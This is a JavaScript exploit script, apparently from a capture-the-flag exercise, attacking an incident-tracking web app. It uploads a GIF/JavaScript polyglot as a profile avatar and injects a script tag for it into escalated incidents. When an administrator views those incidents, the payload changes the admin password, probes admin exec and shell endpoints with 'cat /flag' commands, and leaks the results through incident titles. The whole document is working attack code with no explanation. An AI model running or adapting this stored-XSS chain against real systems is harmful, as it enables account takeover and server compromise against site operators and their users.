// Stage 1: dev bot uploads avatar that changes admin password, then escalates
(async () => {
  var O = self.location.origin;
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  await P('S2|START');

  // Admin XSS payload: change admin password + explore admin endpoints
  var adminJS = [
    'GIF89a=1;(async()=>{',
    "var O=self.location.origin;",
    "var P=function(t){return fetch(O+'/api/incidents',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:String(t).slice(0,105),facility:'Meridian-2',severity:'Watch'})}).catch(function(){})};",
    // Change admin password
    "var cp=await fetch(O+'/api/profile/password',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'Pwned2025!'})});",
    "await P('ADMIN|PWCHANGE|'+cp.status+'|'+(await cp.text()).slice(0,60));",
    // Try alternate password change format
    "var cp2=await fetch(O+'/api/profile/password',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({newPassword:'Pwned2025!',new_password:'Pwned2025!'})});",
    "await P('ADMIN|PWCHANGE2|'+cp2.status+'|'+(await cp2.text()).slice(0,60));",
    // PUT variant
    "var cp3=await fetch(O+'/api/profile/password',{method:'PUT',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'Pwned2025!'})});",
    "await P('ADMIN|PWCHANGE3|'+cp3.status+'|'+(await cp3.text()).slice(0,60));",
    // Read /api/me to check identity and flag
    "var me=await(await fetch(O+'/api/me',{credentials:'same-origin'})).json();",
    "var u=me.user||{};await P('ADMIN|ME|'+u.id+'|'+u.role+'|'+u.email);",
    "await P('ADMIN|FLAG|'+(u.flag||'none').slice(0,90));",
    // Try admin-specific endpoints
    "var eps=['/api/admin/flag','/api/admin/exec','/api/admin/shell','/api/admin/command','/api/admin/system','/api/flag','/api/pwned'];",
    "for(var i=0;i<eps.length;i++){try{var r=await fetch(O+eps[i],{credentials:'same-origin'});await P('ADMIN|EP|'+eps[i]+'|'+r.status+'|'+(await r.text()).slice(0,40))}catch(e){}}",
    // Try POST with command
    "var eps2=['/api/admin/exec','/api/admin/command','/api/developer/exec'];",
    "for(var i=0;i<eps2.length;i++){try{var r=await fetch(O+eps2[i],{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:'cat /flag',command:'cat /flag'})});await P('ADMIN|CMD|'+eps2[i]+'|'+r.status+'|'+(await r.text()).slice(0,40))}catch(e){}}",
    "await P('ADMIN|DONE')})()"
  ].join('');

  // Upload as avatar
  var b64 = btoa(adminJS);
  var avatarUri = 'data:image/gif;base64,' + b64;

  await P('S2|UPLOADING');
  var upRes = await fetch(O + '/api/profile', {
    method: 'POST', credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Dev Bot', organization: 'AegisCore', avatar: avatarUri })
  });
  await P('S2|UPLOAD|' + upRes.status);

  var meRes = await (await fetch(O + '/api/me', { credentials: 'same-origin' })).json();
  var avatarPath = (meRes.user || {}).avatar || '';
  await P('S2|AVATAR|' + avatarPath);

  var xss = '<script src=' + avatarPath + '></script>';

  // Escalate seed incidents 1,2,3 (these should work on fresh instance)
  for (var incId = 1; incId <= 3; incId++) {
    try {
      var escRes = await fetch(O + '/api/incidents/' + incId + '/escalate', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ details: xss })
      });
      await P('S2|ESC|' + incId + '|' + escRes.status);
    } catch(e) { await P('S2|ESCERR|' + incId); }
  }

  // Also escalate some new incidents
  for (var i = 0; i < 2; i++) {
    await fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: 'S2 diag ' + i, facility: 'Meridian-2', severity: 'Critical' })
    });
  }
  var list = await (await fetch(O + '/api/incidents', { credentials: 'same-origin' })).json();
  var myIncs = (list.incidents || []).filter(function(x) { return (x.title || '').indexOf('S2 diag') === 0; });
  for (var j = 0; j < myIncs.length; j++) {
    var esc = await fetch(O + '/api/incidents/' + myIncs[j].id + '/escalate', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ details: xss })
    });
    await P('S2|ESC2|' + myIncs[j].id + '|' + esc.status);
  }

  await P('S2|DONE');
})();
